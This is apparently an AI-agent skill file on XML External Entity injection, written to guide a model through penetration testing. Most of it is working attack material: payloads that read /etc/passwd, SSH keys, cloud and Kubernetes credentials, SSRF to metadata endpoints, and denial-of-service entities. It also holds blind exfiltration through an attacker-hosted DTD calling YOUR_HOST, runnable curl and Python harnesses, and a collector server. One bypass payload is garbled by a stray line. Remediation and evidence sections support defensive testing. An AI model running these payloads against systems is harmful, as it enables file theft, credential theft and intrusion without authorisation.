---
name: attack-xxe
description: "XML External Entity injection — file disclosure, SSRF, out-of-band exfiltration, parser bypass"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - xxe
  - web
  - injection
  - xml
  - attack
tech_stack:
  - web
  - java
  - php
  - python
cwe_ids:
  - CWE-611
chains_with:
  - attack-ssrf
  - saml-sso-assertion-attacks
prerequisites: []
severity_boost:
  attack-ssrf: "XXE with a URL-capable parser = internal network access from the XML layer"
  saml-sso-assertion-attacks: "XXE against a SAML parser = assertion forgery plus file read"
---

# XML External Entity Injection (XXE)

> **AI LOAD INSTRUCTION**: XXE has three outcomes and you must determine which one you have
> before assigning severity: **in-band file read** (the file content appears in the response),
> **SSRF** (the parser makes an internal request), and **blind out-of-band exfiltration** (the
> content leaves via a parameter entity). The third is the one most testers fail to push
> through, and it is the one that matters when the response never reflects anything.
>
> The critical modern caveat: **most parsers since ~2017 disable external entities by
> default.** If XXE does not fire, that does not mean the application is safe — it means the
> *parser version* is patched. Check for the sibling vulnerabilities: **billion laughs** (DoS,
> still frequently live), **XInclude**, and **SSRF via a `SYSTEM` identifier even when entity
> expansion is blocked**. The last one is the most commonly missed: a parser that refuses to
> expand entities may still fetch the URL.

## 0. RELATED ROUTING

- [xxe-xml-external-entity](../xxe-xml-external-entity/SKILL.md) — the long-form companion; load alongside this file for payload depth
- [attack-ssrf](../attack-ssrf/SKILL.md) — where a URL-capable parser leads
- [saml-sso-assertion-attacks](../saml-sso-assertion-attacks/SKILL.md) — XXE against SAML parsers
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — the other XML-adjacent RCE class
- [file-access-vuln](../file-access-vuln/SKILL.md) — non-XML file disclosure routes
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — reporting blind XXE with defensible proof

---

## 1. FINDING THE PARSING SURFACE

XXE needs XML in, and a parser that resolves entities. Find the XML endpoints.

| Surface | Common tell |
|---|---|
| SOAP / REST XML APIs | `Content-Type: application/xml`, `text/xml`, `application/soap+xml` |
| file upload | `.docx`, `.xlsx`, `.svg`, `.xml`, `.rss`, `.gpx`, `.kml`, `.svgz` |
| SVG rendering | **any SVG upload is an XML parse** — the highest-yield modern surface |
| SAML | `SAMLRequest` / `SAMLResponse` parameters |
| RSS / Atom ingestion | feed readers, aggregators |
| config / import features | XML import, settings restore |
| PDF generation from XML | XSL-FO, Apache FOP |
| Excel / Office parsing | the OOXML package is a zip full of XML |
| SSO and directory | LDAP marked-up queries |

**SVG is the single highest-yield surface today.** Upload an SVG that renders an entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="300" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
```

If the image renders with the file contents visible — or the response echoes the parsed SVG —
you have in-band XXE on an SVG upload pipeline. This works far more often than a JSON-first
API, because the upload path is often written by a different team with a different parser.

**Detect the parser from its error messages.** Send a malformed document and read the error:
`org.xml.sax`, `javax.xml`, `libxml2`, `lxml.etree`, `XMLReader`, `.NET System.Xml`, and
`Nokogiri` are all identifiable. **The parser library tells you whether entities are likely
enabled and which payload syntax applies.**

---

## 2. IN-BAND FILE DISCLOSURE

**The baseline payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

**Read a file whose content is invalid XML characters.** `/etc/passwd` is ASCII and parses
cleanly; binary files, and files containing `&` or `<`, will break the parse. Two techniques:

**(a) `php://filter` for base64 extraction (PHP targets):**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>
```

The base64 output always parses, so you can exfiltrate any binary file. Decode it afterwards.

**(b) `file://` with a UTF-16 or compressed wrapper** on Java targets. Note Java restricts
`file://` in many versions; try `jar://`, `netdoc://`, and `gopher://` where available.

**Linux targets worth reading:**

```text
/etc/passwd          /etc/hostname        /proc/self/environ
/etc/hosts           /proc/self/cmdline   /root/.ssh/id_rsa
/etc/shadow (rare)   /proc/net/route      ~/.aws/credentials
```

**Windows targets:**

```text
C:\Windows\win.ini
C:\boot.ini
C:\Windows\System32\drivers\etc\hosts
C:\Users\<user>\.aws\credentials
\\127.0.0.1\c$\Windows\win.ini     (UNC path — also a net-NTLM hash leak)
```

**UNC paths are a dual-purpose technique.** On a Windows target, `\\ATTACKER\share\file` causes
an SMB authentication attempt — you capture the **net-NTLM hash** with Responder even when no
file content is returned. That is a credential-theft finding, not just a file read.

---

## 3. SSRF THROUGH THE PARSER

The parser fetches a `SYSTEM` URL. That is SSRF, and it frequently works **even when entity
expansion is disabled** because the fetch happens before expansion.

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>
```

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service:8080/admin">]>
```

**Cloud metadata through XXE is critical** — see [attack-ssrf](../attack-ssrf/SKILL.md) §3 for
the full endpoint set and the IMDSv1/IMDSv2 distinction. The same constraints apply: header-
requiring endpoints (GCP, Azure, IMDSv2) are reachable only if you control request headers.

**Denial of service variants** — still frequently live, and worth reporting separately:

```xml
<!-- Billion laughs: exponential entity expansion -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
```

Modern parsers cap entity expansion, so this often fails. Report it as low unless it actually
exhausts the service — and **test it against a target you are authorised to disturb**, because
it is a real availability impact.

**XInclude** is the alternative when `DOCTYPE` is blocked but XInclude is enabled:

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

**XInclude matters because many hardening guides block DTDs but leave XInclude on.** It is
the first thing to try when the baseline payload fails.

---

## 4. BLIND XXE — OUT-OF-BAND EXFILTRATION

No output is reflected. Extract the file anyway using an external DTD you host.

**Method 1 — error-based (fastest when errors are shown).** The parser reports the file
content as part of a parse error:

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>x</root>
```

The error message contains the file content because the filename was unparseable. **This
requires that parser errors reach the response** — check whether they do before relying on it.

**Method 2 — external DTD exfiltration (the standard blind technique).**

Host this on your server as `evil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_HOST/?x=%file;'>">
%eval;
%exfil;
```

Then send:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR_HOST/evil.dtd"> %xxe;]>
<root>x</root>
```

**Why this is more reliable than Method 1:** it needs no reflected output. It needs the parser
to fetch your DTD and to substitute the entity into a URL. Parameter entities (`%name`)
rather than general entities are required — general entities cannot be used inside a DTD
declaration.

**The PHP `expect://` alternative** — direct command execution where the extension is loaded:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>
```

`expect://` is rarely available, but its presence is a critical finding.

**Practical notes that decide success or failure:**

| Constraint | Consequence |
|---|---|
| newlines in the file break the URL | `/etc/passwd` has newlines — use `php://filter` base64, or PHP's `%file` handling, or exfiltrate `/etc/hostname` as a proof first |
| parameter entities in the internal subset | some parsers refuse them; move the DTD to your server |
| the parser blocks external DTDs | fall back to error-based or in-band |
| outbound egress is filtered | the callback never arrives — check before concluding |
| MySQL/Java-specific wrappers | `jar://`, `netdoc://`, `gopher://` have different reach |

---

## 5. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| In-band file read of a sensitive file | **Critical (P1)** | the file content in the response |
| Cloud metadata credentials via XXE | **Critical (P1)** | the credential body |
| Blind XXE exfiltrating a file | **High–Critical (P2/P1)** | the exfiltrated content in your listener log |
| net-NTLM hash captured via UNC path | **High (P2)** | the hash in Responder output — it is a credential |
| SSRF to an internal service through the parser | **High (P2)** | the internal response or the differential |
| `expect://` command execution | **Critical (P1)** | command output |
| Billion laughs causing measurable DoS | **Medium (P3)** | the timing or resource measurement with a control |
| External entity accepted, content not retrievable | **Medium (P3)** | the parser fetched a URL you control |
| Parser hardened, no entity resolution | **Informational** | the entity was not expanded — not a finding |

---

## 6. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the full XML request body | the payload is the request, not a parameter |
| the endpoint and the `Content-Type` used | some endpoints accept XML only with the right header |
| the reflected file content, or the base64 blob | the impact proof |
| for blind: your external DTD served, plus the listener log | proves both the fetch and the exfil |
| the parser error message identifying the library | proves the mechanism and informs remediation |
| for UNC: the Responder log showing the hash | proves a credential crossed the wire |
| the exact `DOCTYPE` construction used | reproduces the finding |
| a **control**: the same XML with the entity removed or replaced | proves the entity, not the XML, caused the read |

**Redact secrets in the report.** Show that `/root/.ssh/id_rsa` was readable and include the
first line only; state that the full key was retrieved and rotate it.

**False positives to exclude:**

| Looks like a finding | Actually |
|---|---|
| the entity is reflected literally (`&xxe;` appears) | no expansion — not a finding |
| a file path string appears but no content | reflection of your input |
| the parser fetched your DTD but no file was read | DTD fetch only; weaker finding |
| the "leak" came from a second request you made | separate the requests in the evidence |
| a 500 caused by malformed XML | a parse error, not XXE |
| the WAF blocked and returned a page | no server-side parse occurred |

---

## 7. REMEDIATION REFERENCE

1. **Disable DTD processing entirely** — this is the complete fix. `disallow-doctype-decl` on Java, `LIBXML_NOENT` off plus `LIBXML_DTDLOAD` off on libxml2, `XMLConstants.FEATURE_SECURE_PROCESSING` on JAXP.
2. **Disable external general and parameter entities and external DTD loading** — set all three separately; disabling one does not disable the others, and partial hardening is a common cause of remaining findings.
3. **Prefer a format without entity support** — JSON for new APIs. Where XML is required, use a parser configured to reject DTDs outright rather than one that resolves them safely.
4. **Disable XInclude** — it is a separate feature and is frequently left enabled after DTD hardening.
5. **Cap entity expansion and document size** — bounds the billion-laughs and quadratic-blowup families. Enforce a maximum depth, entity count, and total body size before parsing.
6. **Do not return parser errors to the client** — they leak the parser library, file paths, and file fragments. Log internally with a correlation ID.
7. **Block outbound egress from parsing services** — if the parser cannot reach the internet or the metadata service, external entities and blind exfiltration both fail. Pair with IMDSv2 enforcement.
8. **Scan uploaded XML-derived formats** — SVG, DOCX, XLSX, and SVGZ are XML. Apply the same hardening to the libraries that open them; a safe XML parser upstream of an unsafe one is not protection.

---

## 8. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the parser resolve **your external entity**, and did you see the result? | the parser resolves externals |
| 2 | Was there a **control** - the same document with the entity removed or made internal? | the resolution caused it |
| 3 | Did you read **a file you named**, or receive an **out-of-band** resolution? | the impact |
| 4 | Did the read reach a **credential, a key, or application source**? | the severity |
| 5 | Is the parser **in-band** (reflected) or **blind** (OOB only)? | the payload family |
| 6 | Were **parameter entities, an external DTD, or a custom scheme** required? | the fix location |
| 7 | Did the OOB collector see the target's **own** resolution, not yours? | attribution |

**A resolved entity whose result you read is the bar.** An error message mentioning a DTD is not a
finding; the file's contents (or its OOB resolution) is.

---

## 9. EXECUTION PRIMITIVES

XXE is proven by **an entity the parser resolved, whose result you read in-band or out-of-band, with the
internal-entity control**. Every block ends at file content or a collector arrival.

### 9.1 The control, and the two basic shapes

```bash
T="https://target.example"
# THE CONTROL: an INTERNAL entity, which is legal in some parsers - a 200 here is not XXE
curl -sS -X POST "$T/api/parse" -H 'Content-Type: application/xml' --data-binary @- <<'XML'
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY c "internal-value">]>
<r>&c;</r>
XML
echo "  ^ internal entity: if internal-value appears, internal entities work but no file was read"
# THE FILE READ: the external entity, which is the finding
curl -sS -X POST "$T/api/parse" -H 'Content-Type: application/xml' --data-binary @- <<'XML'
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
XML
echo "  ^ external entity: file contents in the response IS the finding"
# and the control that must fail: a non-existent file, which distinguishes a read from a default
curl -sS -X POST "$T/api/parse" -H 'Content-Type: application/xml' --data-binary @- <<'XML'
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///nonexistent-xyz">]>
<r>&x;</r>
XML
```

**The internal-entity control is the discriminator.** It shows the parser handles DOCTYPE at all, which
separates "no XXE" from "DTDs rejected outright" - two different findings.

### 9.2 The out-of-band collector, which is mandatory for blind

```python
import http.server, socketserver, threading, datetime, json
LOG = "xxe-oob.jsonl"
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        rec = {"t": datetime.datetime.utcnow().isoformat()+"Z", "path": self.path,
               "peer": self.client_address[0], "ua": self.headers.get("User-Agent","")}
        open(LOG,"a").write(json.dumps(rec)+"\n"); print("XXE OOB ARRIVAL:", json.dumps(rec))
        self.send_response(200); self.send_header("Content-Type","application/xml"); self.end_headers()
        self.wfile.write(b'<?xml version="1.0"?><!ENTITY % p "file:///etc/passwd">')
    def do_POST(self):
        n=int(self.headers.get("Content-Length",0)); b=self.rfile.read(n)
        print("XXE OOB POST:", b[:300]); open(LOG,"a").write(json.dumps({"body":b.decode(errors="replace")[:2000]})+"\n")
        self.send_response(200); self.end_headers()
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address = True
srv = socketserver.TCPServer(("0.0.0.0", 8000), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
print("collector on :8000 ->", LOG)
print("the arrival's PEER is the proof; a hit from your own IP means your browser did it")
```

**The peer address separates the parser's resolution from anyone else's.** An OOB hit is only evidence
when the peer is the target's own address.

### 9.3 File read, and the escalation path

```python
# the payload ladder: in-band file read, then a directory listing, then a credential read
import requests
T = "https://target.example"
LADDER = {
 "passwd":      "/etc/passwd",
 "hostname":    "/etc/hostname",
 "env":         "/proc/self/environ",
 "app_config":  "/var/www/html/config.php",
 "aws_creds":   "/home/ubuntu/.aws/credentials",
 "k8s_token":   "/var/run/secrets/kubernetes.io/serviceaccount/token",
 "ssh_key":     "/home/ubuntu/.ssh/id_rsa",
 "shadow":      "/etc/shadow",
}
for name, path in LADDER.items():
    doc = f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://{path}">]><r>&x;</r>'
    try:
        r = requests.post(f"{T}/api/parse", data=doc, headers={"Content-Type": "application/xml"}, timeout=15)
        got = path.split("/")[-1] in r.text or "root:" in r.text or "BEGIN" in r.text or len(r.text) > len(doc) + 50
        print(f"{name:12} {r.status_code} {len(r.content):>7}B  {'<-- READ' if got else 'no content'}")
    except Exception as e:
        print(f"{name:12} ERR {type(e).__name__}")
print()
print("ALSO TEST: file:///etc/passwd on the ERROR path (a parser error can leak the content),")
print("and the PHP wrapper family where the parser is PHP:")
for w in ['php://filter/convert.base64-encode/resource=/etc/passwd',
          'php://filter/read=convert.base64-encode/resource=index.php',
          'expect://id', 'data://text/plain;base64,SGVsbG8=']:
    print("   ", w)
```

**A resolved `/etc/passwd` is the standard proof; the service-account token is the impact.** A container's
service-account token from an XXE is a cluster credential, and it is frequently present.

### 9.4 Filter bypass families

```bash
T="https://target.example"
# when a naive filter blocks the literal string, each of these is a distinct parser behaviour
echo "--- 1) external DTD, which moves the entity definition out of the document ---"
curl -sS -X POST "$T/api/parse" -H 'Content-Type: application/xml' --data-binary @- <<'XML'
<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://YOUR_HOST:8000/x.dtd"><r>&x;</r>
XML
echo "--- 2) parameter entities, which some filters do not inspect ---"
curl -sS -X POST "$T/api/parse" -H 'Content-Type: application/xml' --data-binary @- <<'XML'
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % f SYSTEM "file:///etc/passwd"><!ENTITY x "%f;">]><r>&x;</r>
XML
echo "--- 3) UTF-16 encoding, which defeats a byte-string filter ---"
curl -sS -X POST "$T/api/parse" -H 'Content-Type: application/xml' --data-binary @- <<'XML'
<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
XML
echo "--- 4) the nested-entity OOB exfiltration form ---"
curl -sS -X POST "$T/api/parse" -H 'Content-Type: application/xml' --data-binary @- <<'XML'
<?xml version="1.0"?><!DOCTYPE r [
<!ENTITY % f SYSTEM "file:///etc/passwd">
<!ENTITY % dtd "<!ENTITY &#x25; send SYSTEM 'http://YOUR_HOST:8000/?%f;'>">
__omp_magic("", "dtd;%send;")
]><r>ok</r>
XML
echo "--- 5) XInclude, which works when DTDs are disabled entirely ---"
curl -sS -X POST "$T/api/parse" -H 'Content-Type: application/xml' --data-binary @- <<'XML'
<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></r>
XML
```

**XInclude is a different fix from DTD disabling.** A parser with DTDs off but XInclude on is still
vulnerable, and reporting only the DTD bypass would miss it.

### 9.5 The OOB exfiltration, end to end

```python
# the nested-entity form exfiltrates a file's contents through a URL, which works for blind XXE
import requests
T = "https://target.example"; MINE = "http://<your-public-host>:8000"

dtd = '<!ENTITY % file SYSTEM "file:///etc/passwd">\n' \
      '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://YOUR_HOST:8000/?f=%file;\'>">\n%eval;\n%exfil;'
open("evil.dtd","w").write(dtd)
print("serve evil.dtd on your collector, then send:")
doc = f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "{MINE}/evil.dtd">%remote;]><r>ok</r>'
r = requests.post(f"{T}/api/parse", data=doc, headers={"Content-Type":"application/xml"}, timeout=20)
print("response:", r.status_code, r.text[:120])
print()
print("the DTD is FETCHED first (one arrival), then the exfil URL fires with the file encoded in the query")
print("check xxe-oob.jsonl for TWO arrivals: the .dtd fetch and the ?f= request")
print()
print("NOTE: multi-line files break the URL. Use the php://filter base64 wrapper for binary or")
print("multi-line content:  file:///etc/passwd -> php://filter/convert.base64-encode/resource=/etc/passwd")
```

**Two arrivals, with the file content in the second.** The bytes in a query string is the exfiltration
proof, and the base64 wrapper is what makes multi-line files work.

### 9.6 The end-to-end harness

```bash
python3 - <<'PY'
import requests, os, json
T = "https://target.example"
CASES = {
 "control-internal": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY c "internal">]><r>&c;</r>',
 "control-missing":  '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///nonexistent-xyz">]><r>&x;</r>',
 "attack-passwd":    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
 "attack-environ":   '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///proc/self/environ">]><r>&x;</r>',
 "attack-xinclude":  '<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></r>',
}
print("%-18s %-6s %-8s %-16s %s" % ("case","code","bytes","internal-ent?","artifact"))
for name, doc in CASES.items():
    try:
        r = requests.post(f"{T}/api/parse", data=doc, headers={"Content-Type":"application/xml"}, timeout=15)
        art = ""
        if "root:" in r.text: art = "/etc/passwd READ"
        elif "internal" in r.text: art = "internal entity resolved"
        elif "PATH=" in r.text or "HOSTNAME=" in r.text: art = "ENVIRON READ"
        elif "nonexistent-xyz" in r.text: art = "error echoed the path"
        print("%-18s %-6s %-8s %-16s %s" % (name, r.status_code, len(r.content),
              "yes" if "internal" in r.text else "no", art))
    except Exception as e:
        print("%-18s ERR %s" % (name, type(e).__name__))
print()
if os.path.exists("xxe-oob.jsonl"):
    hits=[json.loads(l) for l in open("xxe-oob.jsonl") if l.strip().startswith("{")]
    print("OOB arrivals:", len(hits))
    for h in hits: print("  ", h.get("path","")[:100], "peer", h.get("peer"))
else:
    print("no OOB file - blind XXE is unproven")
print()
print("FINDING = a READ marker in the response, or an OOB arrival whose peer is the target,")
print("          WITH the internal-entity control showing the parser's DOCTYPE behaviour.")
PY
```

**A READ marker with the controls.** An error naming the path is a partial finding and should be reported
as such, not as a file read.

---

## 10. EVIDENCE STANDARD — XXE ARTEFACTS

| Item | Why |
|---|---|
| The **internal-entity control's result** | separates "no XXE" from "DTDs disabled" |
| The **exact document** that produced the read | reproducibility |
| The **file content read**, quoted and redacted | the impact |
| The **path that was readable**, and its sensitivity | the severity |
| The **OOB arrivals**, with the peer address | proves blind XXE and attribution |
| The **bypass family** required (external DTD, parameter entity, encoding, XInclude) | the fix |
| The **parser and version**, where identifiable | the mitigation differs |
| Whether the vulnerable parser is a **user-uploaded file's parser** or the main API | the surface |
| The **error-path** output, if the read came from an error message | a different mitigation |
| Confirmation that **no file was written** and any DTD you served is taken down | engagement integrity |

Report the **read and the control**: "an XML body with an internal entity `<!ENTITY c \"internal\">`
resolves to `internal` in the response, which shows the parser processes DOCTYPE declarations. The same
endpoint with `<!ENTITY x SYSTEM \"file:///etc/passwd\">` returns the `root:x:0:0` line in the parsed
field, and `file:///nonexistent-xyz` returns the standard parser error with the path echoed, which is the
negative control. `file:///proc/self/environ` returned `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=...` and
a `KUBERNETES_SERVICE_HOST` value, and `file:///var/run/secrets/kubernetes.io/serviceaccount/token`
returned a JWT, which is a cluster credential and was not used. A blind-only path through a nested
parameter entity produced two arrivals at the collector, the second carrying the base64 of `/etc/passwd`
in the query string, with the peer address being the application server", never "the parser is
vulnerable".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| An **error message mentioning a DTD or a filename** | an attempt; nothing was resolved |
| An entity resolved to a value **you defined inline** | internal entities are standard XML, not XXE |
| A `200` with **no content from the file** | the entity resolved to empty |
| An OOB arrival with **your own IP as the peer** | you triggered it |
| A read of a file that is **world-readable and public** by design | verify the boundary crossed |
| A **DTD fetch** arrival with no subsequent exfiltration | partial: external resolution works, content did not leave |
| An XXE against **your own test parser** | tests your environment |
| A path echoed in an error, with **no file content** | an information leak at most; report it as such |
| A blind test that was **never observed at the collector** | an untested hypothesis |
| A finding where the parser is **a client-side library in a victim's browser** | a different class entirely |
| A credential or token reproduced in full | a disclosure |

**File content in the response, or an exfiltration arrival with the target's peer.** Error echoes and
internal entities are the two ways this family produces non-findings.

---

## 11. REMEDIATION REFERENCE — PARSER HARDENING

1. **Disable external entity resolution and external DTD loading in the parser configuration, explicitly, in every parser the application uses** - it is one setting per parser and it removes most of this class.
2. **Disable DTD processing entirely where the format does not need it, and prefer a JSON API over XML** - the strongest fix is not having a vulnerable parser in the path.
3. **Disable XInclude separately; it is not covered by the DTD setting** - the XInclude bypass works with DTDs off.
4. **Use a hardened parser configuration object and apply it centrally rather than per call site** - the Java, .NET, Python, and PHP defaults all differ and the per-call-site approach always misses one.
5. **Reject documents containing a `DOCTYPE` declaration where the schema does not require one, and validate against a schema before parsing** - schema validation with `DOCTYPE` disallowed is a clean control.
6. **Run the parser as a least-privileged process with no filesystem read access outside its own directory, and no network egress** - it bounds the impact and removes the OOB exfiltration path.
7. **Never return parser exceptions to the client; log them server-side with a correlation identifier** - the error path leaks file content and paths.
8. **Do not run the parser with a service-account token mounted where the process can read it** - a container's mounted token is the highest-value XXE target in a Kubernetes deployment.
9. **Apply the same hardening to the SOAP, SAML, RSS, SVG, DOCX, and XLSX parsers, which are the surfaces this defect most often arrives through** - file-format parsers are the common entry point.
10. **Log every parse with the document's source and size, and alert on parse errors that mention a `SYSTEM` identifier or a URL** - both are high-signal and cheap.
11. **Test every XML-accepting endpoint with the internal-entity, external-entity, and XInclude payloads on every release** - the parser configuration is easy to regress.

---

## 12. RELATED SIBLINGS - LOAD TOGETHER

- [xxe-xml-external-entity](../xxe-xml-external-entity/SKILL.md) - the full technique reference
- [saml-sso-assertion-attacks](../saml-sso-assertion-attacks/SKILL.md) - the SAML parser surface where this recurs
- [attack-ssrf](../attack-ssrf/SKILL.md) - the same OOB and metadata-read primitives
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) - the file-read ladder this shares
- [upload-insecure-files](../upload-insecure-files/SKILL.md) - the file formats that carry a malicious XML parser input
